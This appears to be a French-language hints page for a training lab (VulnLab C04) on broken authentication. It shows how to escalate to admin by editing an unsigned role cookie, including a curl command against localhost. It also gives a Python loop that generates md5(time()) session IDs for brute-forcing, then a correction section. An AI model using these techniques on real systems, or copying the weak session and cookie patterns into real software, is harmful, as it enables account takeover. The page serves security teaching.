<?php /* VulnLab C04 — Hints */ ?><!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"><title>C04 — Hints</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#c8d0dc;min-height:100vh;padding:40px 24px}.wrap{max-width:720px;margin:0 auto}h1{font-size:22px;color:#e4e8f0;margin-bottom:6px}.sub{font-size:13px;color:#5a6475;font-family:monospace;margin-bottom:28px}h2{font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:#5a6475;margin:28px 0 12px;padding-bottom:8px;border-bottom:1px solid rgba(255,255,255,.06)}.hint-card{background:#151a22;border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:18px 20px;margin-bottom:12px}.hint-level{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:10px}.l1{color:#16a34a}.l2{color:#d97706}.l3{color:#dc2626}.hint-card p{font-size:14px;color:#8a94a6;line-height:1.7;margin-bottom:8px}.code{background:#1e1e2e;border-radius:8px;padding:14px;font-family:monospace;font-size:12px;color:#cdd6f4;line-height:1.8;margin:10px 0;overflow-x:auto;white-space:pre}a{color:#4a9eff}.back{display:inline-block;margin-bottom:24px;font-size:13px;color:#4a9eff;text-decoration:none}</style></head><body>
<div class="wrap">
<a class="back" href="./">← Retour</a>
<h1>C04 — Broken Authentication</h1>
<p class="sub">PHP 8 · Sessions · Cookies non signés</p>

<h2>Vulnérabilités</h2>
<div class="hint-card"><div class="hint-level l1">Vuln 1 — Cookie role non signé</div>
<p>Le rôle utilisateur est stocké dans un cookie <code>role</code> lisible et modifiable directement dans le navigateur. Aucune signature HMAC ne protège sa valeur.</p>
<div class="code"># Dans DevTools → Application → Cookies
# Changer : role=user  →  role=admin
# Recharger /dashboard.php → flag affiché

# Via curl :
curl http://localhost/c04/dashboard.php -H "Cookie: role=admin; username=hacker"</div></div>

<div class="hint-card"><div class="hint-level l2">Vuln 2 — Session ID prévisible</div>
<p>Le session ID est généré via <code>md5(time())</code>. Un attaquant connaissant l'heure approximative de connexion peut bruteforcer les ID valides.</p>
<div class="code">import hashlib, time
# Générer les IDs possibles autour du timestamp actuel
for t in range(int(time.time())-30, int(time.time())+5):
    print(hashlib.md5(str(t).encode()).hexdigest())</div></div>

<div class="hint-card"><div class="hint-level l3">Correction</div>
<div class="code"># ✅ Ne jamais stocker le rôle dans un cookie non signé
# Stocker uniquement un session ID opaque, lire le rôle côté serveur

session_start();
$role = $_SESSION['role']; // lu depuis la session serveur, pas du cookie

# ✅ Session ID aléatoire (PHP le fait par défaut si on n'override pas)
# Ne pas appeler session_id(md5(time())) !</div></div>
</div></body></html>
